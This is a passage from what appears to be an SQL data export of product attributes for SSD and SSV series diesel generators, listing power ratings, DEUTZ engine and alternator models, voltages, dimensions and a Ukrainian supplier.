(Украина)\r\n'),(73,15,1,'36.3'),(73,15,3,'36.3'),(73,15,4,'36.3'),(73,16,1,'45.375'),(73,16,3,'45.375'),(73,16,4,'45.375'),(73,17,1,'68'),(73,17,3,'68'),(73,17,4,'68'),(73,18,1,'760'),(73,18,3,'760'),(73,18,4,'760'),(73,19,1,'Дизельные генераторы SSD'),(73,19,3,'Дизельные генераторы SSD'),(73,19,4,'Дизельные генераторы SSD'),(73,20,1,'59.4'),(73,20,3,'59.4'),(73,20,4,'59.4'),(73,21,1,'7.95'),(73,21,3,'7.95'),(73,21,4,'7.95'),(73,23,1,'DEUTZ'),(73,23,3,'DEUTZ'),(73,23,4,'DEUTZ'),(73,24,1,'BF4M 2011'),(73,24,3,'BF4M 2011'),(73,24,4,'BF4M 2011'),(73,25,1,'MJB200SA4'),(73,25,3,'MJB200SA4'),(73,25,4,'MJB200SA4'),(73,29,1,'50'),(73,29,3,'50'),(73,29,4,'50'),(73,30,1,'3'),(73,30,3,'3'),(73,30,4,'3'),(73,31,1,'0.8'),(73,31,3,'0.8'),(73,31,4,'0.8'),(73,32,1,'230/400'),(73,32,3,'230/400'),(73,32,4,'230/400'),(73,33,1,'1500'),(73,33,3,'1500'),(73,33,4,'1500'),(73,34,1,'3.75'),(73,34,3,'3.75'),(73,34,4,'3.75'),(73,36,1,'1700'),(73,36,3,'1700'),(73,36,4,'1700'),(73,37,1,'650'),(73,37,3,'650'),(73,37,4,'650'),(73,38,1,'1250'),(73,38,3,'1250'),(73,38,4,'1250'),(73,39,1,'Да'),(73,39,3,'Да'),(73,39,4,'Да'),(73,40,1,'Да'),(73,40,3,'Да'),(74,17,4,'68'),(74,18,1,'900'),(74,18,3,'900'),(74,18,4,'900'),(74,19,1,'Дизельные генераторы SSD'),(74,19,3,'Дизельные генераторы SSD'),(74,19,4,'Дизельные генераторы SSD'),(74,20,1,'81'),(74,20,3,'81'),(74,20,4,'81'),(74,21,1,'9,5'),(74,21,3,'9,5'),(74,21,4,'9,5'),(74,23,1,'DEUTZ'),(74,23,3,'DEUTZ'),(74,23,4,'DEUTZ'),(74,24,1,'BFM4 2011C'),(74,24,3,'BFM4 2011C'),(74,24,4,'BFM4 2011C\r\n'),(74,25,1,'MJB200MA4'),(74,25,3,'MJB200MA4'),(74,25,4,'MJB200MA4'),(74,29,1,'50'),(74,29,3,'50'),(74,29,4,'50'),(74,30,1,'3'),(74,30,3,'3'),(74,30,4,'3'),(74,31,1,'0.8'),(74,31,3,'0.8'),(74,31,4,'0.8'),(74,32,1,'230/400'),(74,32,3,'230/400'),(74,32,4,'230/400'),(74,33,1,'1500'),(74,33,3,'1500'),(74,33,4,'1500'),(74,34,1,'1.8'),(74,34,3,'1.8'),(74,34,4,'1.8'),(74,36,1,'1900'),(74,36,3,'1900'),(74,36,4,'1900'),(74,37,1,'750'),(74,37,3,'750'),(74,37,4,'750'),(74,38,1,'1250'),(74,38,3,'1250'),(74,38,4,'1250'),(74,39,1,'Да'),(74,17,3,'68'),(74,17,1,'68'),(74,16,4,'61.875'),(74,16,3,'61.875'),(74,16,1,'61.875'),(74,15,4,'49.5'),(74,15,3,'49.5'),(74,15,1,'49.5'),(74,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(74,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(74,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(74,13,4,'56.25'),(74,13,3,'56.25'),(74,13,1,'56.25'),(74,12,4,'45'),(74,12,3,'45'),(74,12,1,'45'),(75,17,4,'68'),(75,18,1,'990'),(75,18,3,'990'),(75,18,4,'990'),(75,19,1,'Дизельные генераторы SSD'),(75,19,3,'Дизельные генераторы SSD'),(75,19,4,'Дизельные генераторы SSD'),(75,20,1,'108'),(75,20,3,'108'),(75,20,4,'108'),(75,21,1,'12.7'),(75,21,3,'12.7'),(75,21,4,'12.7'),(75,23,1,'DEUTZ'),(75,23,3,'DEUTZ'),(75,23,4,'DEUTZ'),(75,24,1,'BF4M 2012C'),(75,24,3,'BF4M 2012C'),(75,24,4,'BF4M 2012C'),(75,25,1,'MJB200MB4'),(75,25,3,'MJB200MB4'),(75,25,4,'MJB200MB4'),(75,29,1,'50'),(75,29,3,'50'),(75,29,4,'50'),(75,30,1,'3'),(75,30,3,'3'),(75,30,4,'3'),(75,31,1,'0.8'),(75,31,3,'0.8'),(75,31,4,'0.8'),(75,32,1,'230/400'),(75,32,3,'230/400'),(75,32,4,'230/400'),(75,33,1,'1500'),(75,33,3,'1500'),(75,33,4,'1500'),(75,34,1,'1.8'),(75,34,3,'1.8'),(75,34,4,'1.8'),(75,36,1,'1900'),(75,36,3,'1900'),(75,36,4,'1900'),(75,37,1,'750'),(75,37,3,'750'),(75,37,4,'750'),(75,38,1,'1250'),(75,38,3,'1250'),(75,38,4,'1250'),(75,39,1,'Да'),(75,39,3,'Да'),(75,17,3,'68'),(75,17,1,'68'),(75,16,4,'82.5'),(75,16,3,'82.5'),(75,16,1,'82.5'),(75,15,4,'66'),(75,15,3,'66'),(75,15,1,'66'),(75,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(75,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(75,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(75,13,4,'75'),(75,13,3,'75'),(75,13,1,'75'),(75,12,4,'60'),(75,12,3,'60'),(75,12,1,'60'),(76,17,4,'68'),(76,18,1,'1400'),(76,18,3,'1400'),(76,18,4,'1400'),(76,19,1,'Дизельные генераторы SSD'),(76,19,3,'Дизельные генераторы SSD'),(76,19,4,'Дизельные генераторы SSD'),(76,20,1,'144'),(76,20,3,'144'),(76,20,4,'144'),(76,21,1,'16.96'),(76,21,3,'16.96'),(76,21,4,'16.96'),(76,23,1,'DEUTZ'),(76,23,3,'DEUTZ'),(76,23,4,'DEUTZ'),(76,24,1,'BF4M 1013EC'),(76,24,3,'BF4M 1013EC'),(76,24,4,'BF4M 1013EC'),(76,25,1,'MJB225MA4'),(76,25,3,'MJB225MA4'),(76,25,4,'MJB225MA4'),(76,29,1,'50'),(76,29,3,'50'),(76,29,4,'50'),(76,30,1,'3'),(76,30,3,'3'),(76,30,4,'3'),(76,31,1,'0.8'),(76,31,3,'0.8'),(76,31,4,'0.8'),(76,32,1,'230/400'),(76,32,3,'230/400'),(76,32,4,'230/400'),(76,33,1,'1500'),(76,33,3,'1500'),(76,33,4,'1500'),(76,34,1,'8.56'),(76,34,3,'8.56'),(76,34,4,'8.56'),(76,36,1,'2350'),(76,36,3,'2350'),(76,36,4,'2350'),(76,37,1,'750'),(76,37,3,'750'),(76,37,4,'750'),(76,38,1,'1600'),(76,38,3,'1600'),(76,38,4,'1600'),(76,39,1,'Да'),(76,17,3,'68'),(76,17,1,'68'),(76,16,4,'110'),(76,16,3,'110'),(76,16,1,'110'),(76,15,4,'88'),(76,15,3,'88'),(76,15,1,'88'),(76,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(76,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(76,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(76,13,4,'100'),(76,13,3,'100'),(76,13,1,'100'),(76,12,4,'80'),(76,12,3,'80'),(76,12,1,'80'),(77,13,4,'125'),(77,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(77,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(77,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(77,15,1,'110'),(77,15,3,'110'),(77,15,4,'110'),(77,16,1,'137.5'),(77,16,3,'137.5'),(77,16,4,'137.5'),(77,17,1,'68'),(77,17,3,'68'),(77,17,4,'68'),(77,18,1,'1440'),(77,18,3,'1440'),(77,18,4,'1440'),(77,19,1,'Дизельные генераторы SSD'),(77,19,3,'Дизельные генераторы SSD'),(77,19,4,'Дизельные генераторы SSD'),(77,20,1,'180'),(77,20,3,'180'),(77,20,4,'180'),(77,21,1,'21'),(77,21,3,'21'),(77,21,4,'21'),(77,23,1,'DEUTZ'),(77,23,3,'DEUTZ'),(77,23,4,'DEUTZ'),(77,24,1,'BF4M 1013FC'),(77,24,3,'BF4M 1013FC'),(77,24,4,'BF4M 1013FC'),(77,25,1,'MJB225LA4'),(77,25,3,'MJB225LA4'),(77,25,4,'MJB225LA4'),(77,29,1,'50'),(77,29,3,'50'),(77,29,4,'50'),(77,30,1,'3'),(77,30,3,'3'),(77,30,4,'3'),(77,31,1,'0.8'),(77,31,3,'0.8'),(77,31,4,'0.8'),(77,32,1,'230/400'),(77,32,3,'230/400'),(77,32,4,'230/400'),(77,33,1,'1500'),(77,33,3,'1500'),(77,33,4,'1500'),(77,34,1,'10.2'),(77,34,3,'10.2'),(77,34,4,'10.2'),(77,36,1,'2350'),(77,36,3,'2350'),(77,36,4,'2350'),(77,37,1,'750'),(77,37,3,'750'),(77,37,4,'750'),(77,38,1,'1600'),(77,38,3,'1600'),(77,38,4,'1600'),(77,39,1,'Да'),(77,39,3,'Да'),(77,39,4,'Да'),(77,40,1,'Да'),(77,40,3,'Да'),(78,13,4,'150'),(78,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(78,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(78,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(78,15,1,'132'),(78,15,3,'132'),(78,15,4,'132'),(78,16,1,'165'),(78,16,3,'165'),(78,16,4,'165'),(78,17,1,'68'),(78,17,3,'68'),(78,17,4,'68'),(78,18,1,'1870'),(78,18,3,'1870'),(78,18,4,'1870'),(78,19,1,'Дизельные генераторы SSD'),(78,19,3,'Дизельные генераторы SSD'),(78,19,4,'Дизельные генераторы SSD'),(78,20,1,'216'),(78,20,3,'216'),(78,20,4,'216'),(78,21,1,'25.08'),(78,21,3,'25.08'),(78,21,4,'25.08'),(78,23,1,'DEUTZ'),(78,23,3,'DEUTZ'),(78,23,4,'DEUTZ'),(78,24,1,'BF6M 1013EC'),(78,24,3,'BF6M 1013EC'),(78,24,4,'BF6M 1013EC'),(78,25,1,'MJB250MA4'),(78,25,3,'MJB250MA4'),(78,25,4,'MJB250MA4'),(78,29,1,'50'),(78,29,3,'50'),(78,29,4,'50'),(78,30,1,'3'),(78,30,3,'3'),(78,30,4,'3'),(78,31,1,'0.8'),(78,31,3,'0.8'),(78,31,4,'0.8'),(78,32,1,'230/400'),(78,32,3,'230/400'),(78,32,4,'230/400'),(78,33,1,'1500'),(78,33,3,'1500'),(78,33,4,'1500'),(78,34,1,'12.78'),(78,34,3,'12.78'),(78,34,4,'12.78'),(78,36,1,'2750'),(78,36,3,'2750'),(78,36,4,'2750'),(78,37,1,'900'),(78,37,3,'900'),(78,37,4,'900'),(78,38,1,'1700'),(78,38,3,'1700'),(78,38,4,'1700'),(78,39,1,'Да'),(78,39,3,'Да'),(78,39,4,'Да'),(78,40,1,'Да'),(78,40,3,'Да'),(79,13,4,'185'),(79,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(79,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(79,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(79,15,1,'162.8'),(79,15,3,'162.8'),(79,15,4,'162.8'),(79,16,1,'203.5'),(79,16,3,'203.5'),(79,16,4,'203.5'),(79,17,1,'68'),(79,17,3,'68'),(79,17,4,'68'),(79,18,1,'1940'),(79,18,3,'1940'),(79,18,4,'1940'),(79,19,1,'Дизельные генераторы SSD'),(79,19,3,'Дизельные генераторы SSD'),(79,19,4,'Дизельные генераторы SSD'),(79,20,1,'266.4'),(79,20,3,'266.4'),(79,20,4,'266.4'),(79,21,1,'31.8'),(79,21,3,'31.8'),(79,21,4,'31.8'),(79,23,1,'DEUTZ'),(79,23,3,'DEUTZ'),(79,23,4,'DEUTZ'),(79,24,1,'BF6M 1013FC'),(79,24,3,'BF6M 1013FC'),(79,24,4,'BF6M 1013FC'),(79,25,1,'MJB250MB4'),(79,25,3,'MJB250MB4'),(79,25,4,'MJB250MB4'),(79,29,1,'50'),(79,29,3,'50'),(79,29,4,'50'),(79,30,1,'3'),(79,30,3,'3'),(79,30,4,'3'),(79,31,1,'0.8'),(79,31,3,'0.8'),(79,31,4,'0.8'),(79,32,1,'230/400'),(79,32,3,'230/400'),(79,32,4,'230/400'),(79,33,1,'1500'),(79,33,3,'1500'),(79,33,4,'1500'),(79,34,1,'15.75'),(79,34,3,'15.75'),(79,34,4,'15.75'),(79,36,1,'2800'),(79,36,3,'2800'),(79,36,4,'2800'),(79,37,1,'1000'),(79,37,3,'1000'),(79,37,4,'1000'),(79,38,1,'2000'),(79,38,3,'2000'),(79,38,4,'2000'),(79,39,1,'Да'),(79,39,3,'Да'),(79,39,4,'Да'),(80,38,3,'1800'),(80,38,1,'1800'),(80,37,3,'1050'),(80,37,4,'1050'),(80,36,4,'2900'),(80,37,1,'1050'),(80,36,1,'2900'),(80,36,3,'2900'),(80,34,4,'23.5'),(80,34,3,'23.5'),(80,34,1,'23.5'),(80,33,4,'1500'),(80,33,3,'1500'),(80,33,1,'1500'),(80,32,4,'230/400'),(80,32,3,'230/400'),(80,32,1,'230/400'),(80,31,4,'0.8'),(80,31,3,'0.8'),(80,31,1,'0.8'),(80,30,3,'3'),(80,30,4,'3'),(80,29,4,'50'),(80,30,1,'3'),(80,29,1,'50'),(80,29,3,'50'),(80,25,4,'MJB250LB4'),(80,25,3,'MJB250LB4'),(80,25,1,'MJB250LB4'),(80,24,4,'TCD2013L64V'),(80,24,3,'TCD2013L64V'),(80,24,1,'TCD2013L64V'),(80,23,4,'DEUTZ'),(80,23,3,'DEUTZ'),(80,23,1,'DEUTZ'),(80,21,4,'42'),(80,21,3,'42'),(80,21,1,'42'),(80,20,4,'360'),(80,20,3,'360'),(80,20,1,'360'),(80,19,4,'Дизельные генераторы SSD'),(80,19,3,'Дизельные генераторы SSD'),(80,19,1,'Дизельные генераторы SSD'),(80,18,4,'2140'),(80,18,3,'2140'),(80,18,1,'2140'),(80,17,4,'68'),(80,17,3,'68'),(80,17,1,'68'),(80,16,4,'275'),(80,16,3,'275'),(80,16,1,'275'),(80,15,4,'220'),(80,15,3,'220'),(80,15,1,'220'),(80,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(80,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(80,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(80,13,4,'250'),(81,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(81,15,1,'264'),(81,15,3,'264'),(81,15,4,'264'),(81,16,1,'330'),(81,16,3,'330'),(81,16,4,'330'),(81,17,1,'68'),(81,17,3,'68'),(81,17,4,'68'),(81,18,1,'2300'),(81,18,3,'2300'),(81,18,4,'2300'),(81,19,1,'Дизельные генераторы SSD'),(81,19,3,'Дизельные генераторы SSD'),(81,19,4,'Дизельные генераторы SSD'),(81,20,1,'432'),(81,20,3,'432'),(81,20,4,'432'),(81,21,1,'49.7'),(81,21,3,'49.7'),(81,21,4,'49.7'),(81,23,1,'DEUTZ'),(81,23,3,'DEUTZ'),(81,23,4,'DEUTZ'),(81,24,1,'BF6M 1015C'),(81,24,3,'BF6M 1015C'),(81,24,4,'BF6M 1015C'),(81,25,1,'MJB315SA4'),(81,25,3,'MJB315SA4'),(81,25,4,'MJB315SA4'),(81,29,1,'50'),(81,29,3,'50'),(81,29,4,'50'),(81,30,1,'3'),(81,30,3,'3'),(81,30,4,'3'),(81,31,1,'0.8'),(81,31,3,'0.8'),(81,31,4,'0.8'),(81,32,1,'230/400'),(81,32,3,'230/400'),(81,32,4,'230/400'),(81,33,1,'1500'),(81,33,3,'1500'),(81,33,4,'1500'),(81,34,1,'24.4'),(81,34,3,'24.4'),(81,34,4,'24.4'),(81,36,1,'2600'),(81,36,3,'2600'),(81,36,4,'2600'),(81,37,1,'1350'),(81,37,3,'1350'),(81,37,4,'1350'),(81,38,1,'2300'),(81,38,3,'2300'),(81,38,4,'2300'),(81,39,1,'Да'),(81,39,3,'Да'),(81,39,4,'Да'),(81,40,1,'Да'),(81,40,3,'Да'),(81,40,4,'Да'),(81,41,1,'Да'),(81,41,3,'Да'),(81,41,4,'Да'),(82,13,3,'350'),(82,13,4,'350'),(82,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(82,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(82,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(82,15,1,'308'),(82,15,3,'308'),(82,15,4,'308'),(82,16,1,'385'),(82,16,3,'385'),(82,16,4,'385'),(82,17,1,'68'),(82,17,3,'68'),(82,17,4,'68'),(82,18,1,'2550'),(82,18,3,'2550'),(82,18,4,'2550'),(82,19,1,'Дизельные генераторы SSD'),(82,19,3,'Дизельные генераторы SSD'),(82,19,4,'Дизельные генераторы SSD'),(82,20,1,'504'),(82,20,3,'504'),(82,20,4,'504'),(82,21,1,'58'),(82,21,3,'58'),(82,21,4,'58'),(82,23,1,'DEUTZ'),(82,23,3,'DEUTZ'),(82,23,4,'DEUTZ'),(82,24,1,'BF6M 1015C'),(82,24,3,'BF6M 1015C'),(82,24,4,'BF6M 1015C'),(82,25,1,'MJB315SB4'),(82,25,3,'MJB315SB4'),(82,25,4,'MJB315SB4'),(82,29,1,'50'),(82,29,3,'50'),(82,29,4,'50'),(82,30,1,'3'),(82,30,3,'3'),(82,30,4,'3'),(82,31,1,'0.8'),(82,31,3,'0.8'),(82,31,4,'0.8'),(82,32,1,'230/400'),(82,32,3,'230/400'),(82,32,4,'230/400'),(82,33,1,'1500'),(82,33,3,'1500'),(82,33,4,'1500'),(82,34,1,'28.4'),(82,34,3,'28.4'),(82,34,4,'28.4'),(82,36,1,'2600'),(82,36,3,'2600'),(82,36,4,'2600'),(82,37,1,'1350'),(82,37,3,'1350'),(82,37,4,'1350'),(82,38,1,'2300'),(82,38,3,'2300'),(82,38,4,'2300'),(82,39,1,'Да'),(82,39,3,'Да'),(82,39,4,'Да'),(82,40,1,'Да'),(83,13,3,'400'),(83,13,4,'400'),(83,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(83,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(83,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(83,15,1,'352'),(83,15,3,'352'),(83,15,4,'352'),(83,16,1,'440'),(83,16,3,'440'),(83,16,4,'440'),(83,17,1,'68'),(83,17,3,'68'),(83,17,4,'68'),(83,18,1,'2670'),(83,18,3,'2670'),(83,18,4,'2670'),(83,19,1,'Дизельные генераторы SSD'),(83,19,3,'Дизельные генераторы SSD'),(83,19,4,'Дизельные генераторы SSD'),(83,20,1,'576'),(83,20,3,'576'),(83,20,4,'576'),(83,21,1,'66.6'),(83,21,3,'66.6'),(83,21,4,'66.6'),(83,23,1,'DEUTZ'),(83,23,3,'DEUTZ'),(83,23,4,'DEUTZ'),(83,24,1,'BF8M 1015C'),(83,24,3,'BF8M 1015C'),(83,24,4,'BF8M 1015C'),(83,25,1,'MJB315MA4'),(83,25,3,'MJB315MA4'),(83,25,4,'MJB315MA4'),(83,29,1,'50'),(83,29,3,'50'),(83,29,4,'50'),(83,30,1,'3'),(83,30,3,'3'),(83,30,4,'3'),(83,31,1,'0.8'),(83,31,3,'0.8'),(83,31,4,'0.8'),(83,32,1,'230/400'),(83,32,3,'230/400'),(83,32,4,'230/400'),(83,33,1,'1500'),(83,33,3,'1500'),(83,33,4,'1500'),(83,34,1,'32.5'),(83,34,3,'32.5'),(83,34,4,'32.5'),(83,36,1,'2900'),(83,36,3,'2900'),(83,36,4,'2900'),(83,37,1,'1550'),(83,37,3,'1550'),(83,37,4,'1550'),(83,38,1,'2250'),(83,38,3,'2250'),(83,38,4,'2250'),(83,39,1,'Да'),(83,39,3,'Да'),(83,39,4,'Да'),(83,40,1,'Да'),(84,17,3,'68'),(84,17,4,'68'),(84,18,1,'2870'),(84,18,3,'2870'),(84,18,4,'2870'),(84,19,1,'Дизельные генераторы SSD'),(84,19,3,'Дизельные генераторы SSD'),(84,19,4,'Дизельные генераторы SSD'),(84,20,1,'648'),(84,20,3,'648'),(84,20,4,'648'),(84,21,1,'74.9'),(84,21,3,'74.9'),(84,21,4,'74.9'),(84,23,1,'DEUTZ'),(84,23,3,'DEUTZ'),(84,23,4,'DEUTZ'),(84,24,1,'BF8M 1015C'),(84,24,3,'BF8M 1015C'),(84,24,4,'BF8M 1015C'),(84,25,1,'MJB315MB4'),(84,25,3,'MJB315MB4'),(84,25,4,'MJB315MB4'),(84,29,1,'50'),(84,29,3,'50'),(84,29,4,'50'),(84,30,1,'3'),(84,30,3,'3'),(84,30,4,'3'),(84,31,1,'0.8'),(84,31,3,'0.8'),(84,31,4,'0.8'),(84,32,1,'230/400'),(84,32,3,'230/400'),(84,32,4,'230/400'),(84,33,1,'1500'),(84,33,3,'1500'),(84,33,4,'1500'),(84,34,1,'36.5'),(84,34,3,'36.5'),(84,34,4,'36.5'),(84,36,1,'2900'),(84,36,3,'2900'),(84,36,4,'2900'),(84,37,1,'1550'),(84,37,3,'1550'),(84,37,4,'1550'),(84,38,1,'2250'),(84,38,3,'2250'),(84,38,4,'2250'),(84,39,1,'Да'),(84,17,1,'68'),(84,16,4,'495'),(84,16,3,'495'),(84,16,1,'495'),(84,15,4,'396'),(84,15,3,'396'),(84,15,1,'396'),(84,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(84,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(84,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(84,13,4,'450'),(84,13,3,'450'),(84,13,1,'450'),(84,12,4,'360'),(84,12,3,'360'),(84,12,1,'360'),(85,17,3,'68'),(85,17,4,'68'),(85,18,1,'3100'),(85,18,3,'3100'),(85,18,4,'3100'),(85,19,1,'Дизельные генераторы SSD'),(85,19,3,'Дизельные генераторы SSD'),(85,19,4,'Дизельные генераторы SSD'),(85,20,1,'720'),(85,20,3,'720'),(85,20,4,'720'),(85,21,1,'88'),(85,21,3,'88'),(85,21,4,'88'),(85,23,1,'DEUTZ'),(85,23,3,'DEUTZ'),(85,23,4,'DEUTZ'),(85,24,1,'BF8M 1015CP'),(85,24,3,'BF8M 1015CP'),(85,24,4,'BF8M 1015CP'),(85,25,1,'MJB355SA4'),(85,25,3,'MJB355SA4'),(85,25,4,'MJB355SA4'),(85,29,1,'50'),(85,29,3,'50'),(85,29,4,'50'),(85,30,1,'3'),(85,30,3,'3'),(85,30,4,'3'),(85,31,1,'0.8'),(85,31,3,'0.8'),(85,31,4,'0.8'),(85,32,1,'230/400'),(85,32,3,'230/400'),(85,32,4,'230/400'),(85,33,1,'1500'),(85,33,3,'1500'),(85,33,4,'1500'),(85,34,1,'41.8'),(85,34,3,'41.8'),(85,34,4,'41.8'),(85,36,1,'2900'),(85,36,3,'2900'),(85,36,4,'2900'),(85,37,1,'1850'),(85,37,3,'1850'),(85,37,4,'1850'),(85,38,1,'2350'),(85,38,3,'2350'),(85,38,4,'2350'),(85,39,1,'Да'),(85,17,1,'68'),(85,16,4,'550'),(85,16,3,'550'),(85,16,1,'550'),(85,15,4,'440'),(85,15,3,'440'),(85,15,1,'440'),(85,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(85,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(85,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(85,13,4,'500'),(85,13,3,'500'),(85,13,1,'500'),(85,12,4,'400'),(85,12,3,'400'),(85,12,1,'400'),(86,40,3,'Да'),(86,40,1,'Да'),(86,39,4,'Да'),(86,39,3,'Да'),(86,38,4,'1750'),(86,39,1,'Да'),(86,38,1,'1750'),(86,38,3,'1750'),(86,37,3,'800'),(86,37,4,'800'),(86,37,1,'800'),(86,36,4,'2150'),(86,36,3,'2150'),(86,36,1,'2150'),(86,34,4,'9.04'),(86,34,3,'9.04'),(86,34,1,'9.04'),(86,33,4,'1500'),(86,33,3,'1500'),(86,33,1,'1500'),(86,32,4,'230/400'),(86,32,3,'230/400'),(86,32,1,'230/400'),(86,31,4,'0.8'),(86,31,3,'0.8'),(86,31,1,'0.8'),(86,30,4,'3'),(86,30,3,'3'),(86,30,1,'3'),(86,29,4,'50'),(86,29,3,'50'),(86,29,1,'50'),(86,25,4,'MJB225MA4'),(86,25,3,'MJB225MA4'),(86,25,1,'MJB225MA4'),(86,24,4,'TAD531GE'),(86,24,3,'TAD531GE'),(86,24,1,'TAD531GE'),(86,23,4,'DEUTZ'),(86,23,3,'DEUTZ'),(86,23,1,'DEUTZ'),(86,21,4,'17.36'),(86,21,3,'17.36'),(86,21,1,'17.36'),(86,20,4,'144'),(86,20,3,'144'),(86,20,1,'144'),(86,19,4,'Дизельные генераторы SSV'),(86,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(86,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(86,15,1,'88'),(86,15,3,'88'),(86,15,4,'88'),(86,16,1,'110'),(86,16,3,'110'),(86,16,4,'110'),(86,17,1,'68'),(86,17,3,'68'),(86,17,4,'68'),(86,18,1,'1300'),(86,18,3,'1300'),(86,18,4,'1300'),(86,19,1,'Дизельные генераторы SSV'),(86,19,3,'Дизельные генераторы SSV'),(87,39,4,'Да'),(87,39,3,'Да'),(87,39,1,'Да'),(87,38,4,'1750'),(87,38,3,'1750'),(87,37,4,'800'),(87,38,1,'1750'),(87,37,1,'800'),(87,37,3,'800'),(87,36,3,'2300'),(87,36,4,'2300'),(87,36,1,'2300'),(87,34,4,'11.1'),(87,34,3,'11.1'),(87,34,1,'11.1'),(87,33,4,'1500'),(87,33,3,'1500'),(87,33,1,'1500'),(87,32,4,'230/400'),(87,32,3,'230/400'),(87,32,1,'230/400'),(87,31,4,'0.8'),(87,31,3,'0.8'),(87,31,1,'0.8'),(87,30,4,'3'),(87,30,3,'3'),(87,30,1,'3'),(87,29,4,'50'),(87,29,3,'50'),(87,29,1,'50'),(87,25,4,'MJB225LA4'),(87,25,3,'MJB225LA4'),(87,25,1,'MJB225LA4'),(87,24,4,'TAD532GE'),(87,24,3,'TAD532GE'),(87,24,1,'TAD532GE'),(87,23,4,'DEUTZ'),(87,23,3,'DEUTZ'),(87,23,1,'DEUTZ'),(87,21,4,'22.6'),(87,21,3,'22.6'),(87,21,1,'22.6'),(87,20,4,'190.08'),(87,20,3,'190.08'),(87,20,1,'190.08'),(87,19,4,'Дизельные генераторы SSV'),(87,19,3,'Дизельные генераторы SSV'),(87,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(87,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(87,15,1,'116.16'),(87,15,3,'116.16'),(87,15,4,'116.16'),(87,16,1,'145.2'),(87,16,3,'145.2'),(87,16,4,'145.2'),(87,17,1,'68'),(87,17,3,'68'),(87,17,4,'68'),(87,18,1,'1370'),(87,18,3,'1370'),(87,18,4,'1370'),(87,19,1,'Дизельные генераторы SSV'),(88,40,3,'Да'),(88,40,1,'Да'),(88,39,4,'Да'),(88,39,3,'Да'),(88,39,1,'Да'),(88,38,4,'1750'),(88,38,3,'1750'),(88,37,4,'900'),(88,38,1,'1750'),(88,37,1,'900'),(88,37,3,'900'),(88,36,3,'2350'),(88,36,4,'2350'),(88,36,1,'2350'),(88,34,4,'13.14'),(88,34,3,'13.14'),(88,34,1,'13.14'),(88,33,4,'1500'),(88,33,3,'1500'),(88,33,1,'1500'),(88,32,4,'230/400'),(88,32,3,'230/400'),(88,32,1,'230/400'),(88,31,4,'0.8'),(88,31,3,'0.8'),(88,31,1,'0.8'),(88,30,4,'3'),(88,30,3,'3'),(88,30,1,'3'),(88,29,4,'50'),(88,29,3,'50'),(88,29,1,'50'),(88,25,4,'MJB250MA4'),(88,25,3,'MJB250MA4'),(88,25,1,'MJB250MA4'),(88,24,4,'TAD731GE'),(88,24,3,'TAD731GE'),(88,24,1,'TAD731GE'),(88,23,4,'DEUTZ'),(88,23,3,'DEUTZ'),(88,23,1,'DEUTZ'),(88,21,4,'25.8'),(88,21,3,'25.8'),(88,21,1,'25.8'),(88,20,4,'216'),(88,20,3,'216'),(88,20,1,'216'),(88,19,4,'Дизельные генераторы SSV'),(88,19,3,'Дизельные генераторы SSV'),(88,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(88,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(88,15,1,'132'),(88,15,3,'132'),(88,15,4,'132'),(88,16,1,'165'),(88,16,3,'165'),(88,16,4,'165'),(88,17,1,'68'),(88,17,3,'68'),(88,17,4,'68'),(88,18,1,'1570'),(88,18,3,'1570'),(88,18,4,'1570'),(88,19,1,'Дизельные генераторы 